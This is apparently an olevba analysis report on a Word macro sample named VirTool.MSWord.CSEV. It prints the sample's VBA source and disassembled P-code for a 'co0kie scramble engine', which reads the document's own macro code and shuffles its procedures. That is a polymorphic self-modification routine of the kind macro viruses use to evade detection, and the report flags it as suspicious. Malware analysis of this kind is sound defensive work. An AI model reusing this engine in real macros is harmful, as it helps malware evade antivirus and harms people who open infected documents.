olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: VirTool.MSWord.CSEV
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: VirTool.MSWord.CSEV - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Function co0kie(co0kielines, co0kieprocs)
Dim co0kie22(99), co0kie23(99)
Set ourco0kie = ThisDocument.VBProject.vbcomponents(1).codemodule
For i = 1 To co0kielines
curco0kie = tmpco0kie: tmpco0kie = ourco0kie.ProcOfLine(i, 1)
If curco0kie <> tmpco0kie Then y = y + 1
co0kie22(y) = co0kie22(y) & ourco0kie.lines(i, 1) & vbCr
Next
For x = 1 To co0kieprocs
co0kie22(x) = Left(co0kie22(x), Len(co0kie22(x)) - 1)
c22 = 0: c23 = 0: c24 = Int(Rnd * (co0kieprocs - x) + 1)
While c22 < c24
If co0kie23(c23 + 1) = "" Then c22 = c22 + 1
c23 = c23 + 1
Wend
co0kie23(c23) = x
Next
For i = 1 To co0kieprocs: co0kie = co0kie & co0kie22(co0kie23(i)) & vbCr: Next
co0kie = Left(co0kie, Len(co0kie) - 1)
End Function
'co0kie scramble engine 0.666
'idea and code by jackie
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: VirTool.MSWord.CSEV
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 4856 bytes
' Line #0:
' 	FuncDefn (Private Function co0kie(co0kielines, co0kieprocs, id_FFFE As Variant))
' Line #1:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0063 
' 	VarDefn co0kie22
' 	OptionBase 
' 	LitDI2 0x0063 
' 	VarDefn co0kie23
' Line #2:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd vbcomponents 0x0001 
' 	MemLd codemodule 
' 	Set ourco0kie 
' Line #3:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld co0kielines 
' 	For 
' Line #4:
' 	Ld tmpco0kie 
' 	St curco0kie 
' 	BoS 0x0000 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld ourco0kie 
' 	ArgsMemLd ProcOfLine 0x0002 
' 	St tmpco0kie 
' Line #5:
' 	Ld curco0kie 
' 	Ld tmpco0kie 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld y 
' 	LitDI2 0x0001 
' 	Add 
' 	St y 
' 	EndIf 
' Line #6:
' 	Ld y 
' 	ArgsLd co0kie22 0x0001 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld ourco0kie 
' 	ArgsMemLd lines 0x0002 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	Ld y 
' 	ArgsSt co0kie22 0x0001 
' Line #7:
' 	StartForVariable 
' 	Next 
' Line #8:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld co0kieprocs 
' 	For 
' Line #9:
' 	Ld x 
' 	ArgsLd co0kie22 0x0001 
' 	Ld x 
' 	ArgsLd co0kie22 0x0001 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld x 
' 	ArgsSt co0kie22 0x0001 
' Line #10:
' 	LitDI2 0x0000 
' 	St c22 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St c23 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	Ld co0kieprocs 
' 	Ld x 
' 	Sub 
' 	Paren 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St c24 
' Line #11:
' 	Ld c22 
' 	Ld c24 
' 	Lt 
' 	While 
' Line #12:
' 	Ld c23 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd co0kie23 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld c22 
' 	LitDI2 0x0001 
' 	Add 
' 	St c22 
' 	EndIf 
' Line #13:
' 	Ld c23 
' 	LitDI2 0x0001 
' 	Add 
' 	St c23 
' Line #14:
' 	Wend 
' Line #15:
' 	Ld x 
' 	Ld c23 
' 	ArgsSt co0kie23 0x0001 
' Line #16:
' 	StartForVariable 
' 	Next 
' Line #17:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld co0kieprocs 
' 	For 
' 	BoS 0x0000 
' 	Ld co0kie 
' 	Ld i 
' 	ArgsLd co0kie23 0x0001 
' 	ArgsLd co0kie22 0x0001 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St co0kie 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Next 
' Line #18:
' 	Ld co0kie 
' 	Ld co0kie 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	St co0kie 
' Line #19:
' 	EndFunc 
' Line #20:
' 	QuoteRem 0x0000 0x001C "co0kie scramble engine 0.666"
' Line #21:
' 	QuoteRem 0x0000 0x0017 "idea and code by jackie"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

